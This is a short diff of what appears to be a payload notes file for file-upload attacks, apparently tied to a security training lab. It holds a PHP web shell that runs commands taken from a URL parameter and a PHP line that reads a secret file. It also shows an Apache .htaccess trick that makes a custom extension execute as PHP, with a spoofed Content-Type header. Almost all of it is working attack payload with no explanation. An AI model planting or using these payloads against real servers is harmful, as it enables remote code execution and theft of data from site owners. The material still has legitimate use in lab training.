@@ -1,8 +1,11 @@
+<?php echo file_get_contents('/home/carlos/secret'); ?>
 <?php system($_GET['cmd']); ?>
 
 #Apache Bypass
-
+Before:
 filename=".htaccess"
 Content-Type: text/plain
 AddType application/x-httpd-php .shell
+After:
+Content-Type: application/x-httpd-php
 
